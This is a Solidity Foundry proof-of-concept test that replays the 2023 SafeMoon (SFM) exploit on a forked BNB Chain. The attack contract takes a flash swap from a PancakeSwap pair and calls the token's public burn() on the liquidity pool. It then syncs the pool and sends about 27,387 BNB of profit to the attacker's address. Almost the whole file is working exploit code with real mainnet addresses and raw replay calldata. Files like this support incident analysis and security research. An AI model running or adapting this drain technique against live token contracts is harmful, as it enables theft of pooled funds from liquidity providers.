
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 26864889;
    uint256 constant TX_TIMESTAMP = 1680031587;
    uint256 constant TX_BLOCK_NUMBER = 26864890;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "BNB", 27387357095483374950933);
        _expectProfit(Addresses.attack_contract, attack, Addresses.SFM, "SFM", 935969814143858147);
    }
}

contract OurAttack {





    function attack() external payable {
        _attack();
    }

    function _call() internal {
        IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.OptimizedTransparentUpgradeableProxy);
        IERC20Like(Addresses.WBNB).approve(Addresses.OptimizedTransparentUpgradeableProxy, type(uint256).max);
        IERC20Like(Addresses.SFM).allowance(address(this), Addresses.OptimizedTransparentUpgradeableProxy);
        IERC20Like(Addresses.SFM).approve(Addresses.OptimizedTransparentUpgradeableProxy, type(uint256).max);
        IERC20Like(Addresses.Safemoon)
            .allowance(address(this), Addresses.OptimizedTransparentUpgradeableProxy);
        IERC20Like(Addresses.Safemoon)
            .approve(Addresses.OptimizedTransparentUpgradeableProxy, type(uint256).max);
        {
            bytes memory replayCallData =
                hex"022c0d9f00000000000000000000000000000000000000000000003635c9adc5dea000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a1fae685c8abf938eb706dedabbcffbff3b3d7da00000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000b00000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000002200000000000000000000000000000000000000000000000000000000000000a60000000000000000000000000000000000000000000000000000000009eaf1c75000000000000000000000000000000000000000000000000000000000000000c0000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c0100d08239ffff0000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c0100c7b889ffff0000000000524bc73fcb4fb70e2e84dc08efe255252a3b026e0100c601dd0000000000000042981d0bfbaf196529376ee702f2a9eb9092fcb50100757330ffff000000000042981d0bfbaf196529376ee702f2a9eb9092fcb501006b12e6ffff00000000008e0301e3bde2397449fef72703e71284d0d149f10100630119ffff000000000042981d0bfbaf196529376ee702f2a9eb9092fcb501005dd3e2ffff0000000000524bc73fcb4fb70e2e84dc08efe255252a3b026e0100519b1300010000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c01000516e400020000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c0100049534ffff0000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c0100039c38ffff0000000000286e09932b8d096cba3423d12965042736b8f8500600002cec0003000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000001800000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000026000000000000000000000000000000000000000000000000000000000000003c0000000000000000000000000000000000000000000000000000000000000044000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000500000000000000000000000000000000000000000000000000000000000000058000000000000000000000000000000000000000000000000000000000000006e0000000000000000000000000000000000000000000000000000000000000072000000000000000000000000000000000000000000000000000000000000007a000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000044095ea7b30000000000000000000000006ac68913d8fccd52d196b09e6bc0205735a4be5f00000000000000000000000000000000000000000000003635c9adc5dea000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000242e1a7d4d0000000000000000000000000000000000000000000000058b00f9419bb100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001249166aecd0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000030aac8b48442ef0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000a1fae685c8abf938eb706dedabbcffbff3b3d7da000000000000000000000000000000000000000000000000016345785d8a00000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000042981d0bfbaf196529376ee702f2a9eb9092fcb50000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000449dc29fac0000000000000000000000008e0301e3bde2397449fef72703e71284d0d149f1000000000000000000000000000000000000000000000001ba6d549f4c05f2600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000449dc29fac00000000000000000000000042981d0bfbaf196529376ee702f2a9eb9092fcb5000000000000000000000000000000000000000000000000006f6b752fd4d3a4000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004fff6cae9000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044095ea7b30000000000000000000000006ac68913d8fccd52d196b09e6bc0205735a4be5f0000000000000000000000000000000000000000000000000cfe4c6c16f3344a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001249166aecd0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000110d9316ec000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000a1fae685c8abf938eb706dedabbcffbff3b3d7da000000000000000000000000000000000000000000000000016345785d8a0000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000042981d0bfbaf196529376ee702f2a9eb9092fcb5000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004d0e30db0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044a9059cbb0000000000000000000000001cea83ec5e48d9157fcae27a19807bef79195ce10000000000000000000000000000000000000000000000367b2d3f48239400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000242e1a7d4d0000000000000000000000000000000000000000000005ccbd3914a9fef4821500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000001f399b1438a10000000000000000000000000000000000000000000000000003d7cb807dce23611600000000000000000000000000000000000000000000000193fbddaf94ec9eea0000000000000000000000000000000000000000000005ccbd3914a9fef48215";
            (bool ok,) = Addresses.Cake_LP.call(replayCallData);
            require(ok, "replay selector 0x022c0d9f failed");
        }
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
    }

    function _callback() internal {
        _markCallback(1);
        IERC20Like(Addresses.WBNB)
            .approve(Addresses.OptimizedTransparentUpgradeableProxy, 1000000000000000000000);
        uint256 withdrawAvailableAmount = IERC20Like(Addresses.WBNB).balanceOf(address(this));
        if (withdrawAvailableAmount > 102250000000000000000) withdrawAvailableAmount = 102250000000000000000;
        IWBNB(Addresses.WBNB).withdraw(withdrawAvailableAmount);
        {
            bytes memory replayCallData =
                hex"9166aecd0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000030aac8b48442ef0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000a1fae685c8abf938eb706dedabbcffbff3b3d7da000000000000000000000000000000000000000000000000016345785d8a00000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000042981d0bfbaf196529376ee702f2a9eb9092fcb5";
            (bool ok,) = payable(Addresses.A_524BC7_026E).call{value: 2250000000000000000}(replayCallData);
            require(ok, "replay selector 0x9166aecd failed");
        }
        ISFM(Addresses.SFM).burn(Addresses.SFS_LP, 31880230380377600608);
        ISFM(Addresses.SFM).burn(Addresses.SFM, 31361873472705444);
        {
            bytes memory replayCallData = hex"fff6cae9";
            (bool ok,) = Addresses.SFS_LP.call(replayCallData);
            require(ok, "replay selector 0xfff6cae9 failed");
        }
        IERC20Like(Addresses.SFM).approve(Addresses.OptimizedTransparentUpgradeableProxy, 936269799664858186);
        {
            bytes memory replayCallData =
                hex"9166aecd0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000110d9316ec000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000a1fae685c8abf938eb706dedabbcffbff3b3d7da000000000000000000000000000000000000000000000000016345785d8a0000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000042981d0bfbaf196529376ee702f2a9eb9092fcb5000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";
            (bool ok,) = payable(Addresses.A_524BC7_026E).call{value: 70889895637373116694}(replayCallData);
            require(ok, "replay selector 0x9166aecd failed");
        }
        {
            uint256 depositAmount = address(this).balance;
            if (depositAmount > 29110104362626883306) depositAmount = 29110104362626883306;
            if (depositAmount != 0) IWBNB(Addresses.WBNB).deposit{value: depositAmount}();
        }
        {
            Harness.vmExt().startPrank(address(this));
            IERC20Like(Addresses.WBNB).transfer(Addresses.Cake_LP, 1005000000000000000000);

            Harness.vmExt().stopPrank();
        }
        uint256 withdrawAvailableAmount_2 = IERC20Like(Addresses.WBNB).balanceOf(address(this));
        if (withdrawAvailableAmount_2 > 27388603157452174950933) withdrawAvailableAmount_2 = 27388603157452174950933;
        IWBNB(Addresses.WBNB).withdraw(withdrawAvailableAmount_2);
        {
            uint256 nativeTransferAmount = address(this).balance;
            if (nativeTransferAmount > 27388603157452174950933) nativeTransferAmount = 27388603157452174950933;
            (bool ok,) = payable(Addresses.attacker_eoa).call{value: nativeTransferAmount}("");
            if (!ok)
            {  }
        }
    }

    function _attack() internal {
        _call();
        uint256 chiFreeFromUpToACe60b70867 = ICHI(Addresses.CHI).freeFromUpTo(Addresses.A_CE60B7_0867, 40);
    }

    function _attack2() internal {
        _markCallback(3);
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0x7d952ebb) {
            _call();
            return;
        }
        if (msg.sig == 0x84800812) {
            _callback();
            return;
        }
        if (msg.sig == 0xf321f780) {
            _attack();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct ReplayCall {
    address target;
    bytes data;
}

interface VmExt {
    function startPrank(address msgSender) external;
    function stopPrank() external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal constant CHI = 0x0000000000004946c0e9F43F4Dee607b0eF1fA1c;
    address internal constant A_05FF99_8A12 = 0x05ff99468081E872CBf4704f2dE87cf483A98A12;
    address internal constant A_06AC9E_E852 = 0x06ac9e6ED03191F1508FFbBA75b38347f960E852;
    address internal constant A_0D17F0_1289 = 0x0D17F0681211c4Ff36438Eae1331161eDb9F1289;
    address internal constant A_0FDEA2_0717 = 0x0fdea2DEc80eA46C5Fe6CF208CfDdC0Bb5AD0717;
    address internal constant A_17BEDF_F789 = 0x17bedfFd16b090D4dfEcF66877eC93a66824F789;
    address internal constant Cake_LP = 0x1CEa83EC5E48D9157fCAe27a19807BeF79195Ce1;
    address internal constant A_219590_705C = 0x21959075f65A7c3e94Bf77c0B2447072f6f4705C;
    address internal constant A_23D1C2_7597 = 0x23d1C2028112dfd93F490395D69880f61Bd67597;
    address internal constant A_26684D_62E1 = 0x26684df974E6230a74d61dA61BB35307dE1662e1;
    address internal constant attacker_eoa = 0x286E09932B8D096cbA3423d12965042736b8F850;
    address internal constant A_3187A1_CA3D = 0x3187a19d921833AA4CEE5Fc944c3Ea1a1BD5ca3d;
    address internal constant SFM = 0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5;
    address internal constant A_464422_35E5 = 0x46442220AE16a2acE25Abb27b598617648FA35e5;
    address internal constant A_4F3A14_2F5C = 0x4f3A14685ab968baDF97E272a012613b53532F5c;
    address internal constant A_4FFC89_AFA1 = 0x4FFC89095F13BD558ac36d6B4c4D450C5C98aFa1;
    address internal constant A_524BC7_026E = 0x524BC73fCb4fB70E2E84dC08EFE255252A3b026E;
    address internal constant A_548F18_B580 = 0x548F18F68436790d44aD71F81d1a654E51E0b580;
    address internal constant A_5EB60E_0D18 = 0x5Eb60E8a79608941122B815EeC6427E2FC490D18;
    address internal constant A_5ECF29_1F93 = 0x5ecF29477Fbd56f61C05e1e107fC1B46FC711f93;
    address internal constant A_5F9EE6_DE8B = 0x5F9ee69944403d10299709fEc79359EF3Cd7de8b;
    address internal constant A_631110_85FC = 0x6311101C5d45296835D6e1234641F300d99c85Fc;
    address internal constant A_65E392_106A = 0x65e39284f84119FC545e56f7bA994280a2c2106a;
    address internal constant FeeJar = 0x67347AD9ffBc7D4CF74f1E447291470E9dC6e251;
    address internal constant A_676845_53D0 = 0x676845FD14F98014c285AE40366d43C0e70253d0;
    address internal constant A_678EE2_F590 = 0x678ee23173dce625A90ED651E91CA5138149F590;
    address internal constant OptimizedTransparentUpgradeableProxy = 0x6AC68913d8FcCD52d196B09e6bC0205735A4be5f;
    address internal constant A_6C20D8_DE6F = 0x6c20d80Fc7eAb5f929801DF0C3716520751dDE6f;
    address internal constant A_6EF48A_A31A = 0x6Ef48a762b35B90c3808Dc397851633EE293A31A;
    address internal constant A_80A8E9_9C5F = 0x80a8E95CF341A5626D26A9eDdA1D4f93fe4A9c5F;
    address internal constant A_83681E_B2A5 = 0x83681E35607097EB7f6E7D73CcF1C92Fbd28b2A5;
    address internal constant A_8C561B_145C = 0x8C561B2a7a54a79DAB60ADF62E576251C42E145C;
    address internal constant A_8D6350_A278 = 0x8d63502B5E50f8F100C407B34ef16bF808DFA278;
    address internal constant SFS_LP = 0x8e0301E3bDE2397449FeF72703E71284d0d149F1;
    address internal constant A_92425F_DC7B = 0x92425f318FE3367854bb4730eaF1e8002306dC7b;
    address internal constant A_9ACAC6_9B58 = 0x9AcAC67B287d8b2606247A8439CFa90ac6349b58;
    address internal constant attack_contract = 0xa1fAe685c8abF938EB706DedABbcfFbFf3b3D7Da;
    address internal constant A_A54117_CCB5 = 0xA54117642D450FcBae672A21DB2aA82dc3f5CCb5;
    address internal constant A_A756E6_0124 = 0xA756e6FC30bec738fCD303031Ae9b2C08Ec40124;
    address internal constant A_AA6246_E9C3 = 0xaA62468F41d9f1076920FEB60B561a84Ce62E9c3;
    address internal constant A_B12E90_D273 = 0xB12E90c00C17c3cC9d4D21f4d654a38dCb4Cd273;
    address internal constant A_B1F33E_A256 = 0xB1F33e9dbFCd79Ccc03f04D1695b94F8Dc9Fa256;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant A_BBFB2E_004C = 0xBBFb2Edaf0F30E7C124d7474330156822125004c;
    address internal constant A_BCACA8_D77D = 0xbCAca80BFE0748a5992650D57EDf8DB06DcBd77d;
    address internal constant A_BE4F47_8CAA = 0xbe4f47612Ac884c8f3da0f9f0Ca7735ae14f8CAA;
    address internal constant A_BFB89E_6A40 = 0xbFB89E5949e6b147D6Cc73B779820a51776e6A40;
    address internal constant A_C2836C_E9E5 = 0xc2836Ca57c05Dd69b4e231B8Ce0b37e04780e9E5;
    address internal constant A_C70703_22DD = 0xc70703a4c103187fae73230738AAf82FB53422Dd;
    address internal constant A_C8AAE8_C7F9 = 0xc8AAE8789D7390cf48Fe1B41182F78324392c7F9;
    address internal constant A_CE60B7_0867 = 0xcE60b76055BAAD18CFAaBC8F894feF7a15610867;
    address internal constant A_D919B3_2CED = 0xd919b3652B421C78a96762ABDa1dfe1f9bDa2Ced;
    address internal constant A_DA6206_87AD = 0xDa6206c72F9156b3ae1De8180CB071bC7FdB87ad;
    address internal constant A_DC0915_098E = 0xDc09159c7E5F06705cFaCD444dD67A0952aC098E;
    address internal constant ELEPHANT = 0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688;
    address internal constant A_E4A0D3_5515 = 0xE4a0d3668751D7FC5c37bC92fB260f19D7cF5515;
    address internal constant Safemoon = 0xEb11a0a0beF1AC028B8C2d4CD64138DD5938cA7A;
    address internal constant A_EFECD6_A5D6 = 0xefeCD68F9549D47cBECA0A2Fd9bd09CF4eC6a5D6;
    address internal constant A_F2C25C_C605 = 0xF2C25c4F107Adb4B3AB680bD357a46572C08C605;
    address internal constant A_F7BBCB_5D1C = 0xF7bbCb8D9FfD42E54929b326E8FE2D30731c5d1c;
    address internal constant A_F8DCBF_033B = 0xF8DCbf75812C991AB749Ed60Fd146009F885033B;
}

struct Abi_swapExactTokensForTokensWithFeeAmount_Param0 {
    uint256 field0;
    uint256 field1;
    address[] field2;
    address field3;
    uint256 field4;
}

interface ICHI {
    function freeFromUpTo(address, uint256) external returns (uint256);
}

interface IContract_524BC7_026E {
    function swapExactTokensForTokensWithFeeAmount(Abi_swapExactTokensForTokensWithFeeAmount_Param0 calldata)
        external
        payable;
}

interface ISFM {
    function burn(address, uint256) external;
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
}

interface IUniswapV2PairLike {
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256) external;
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
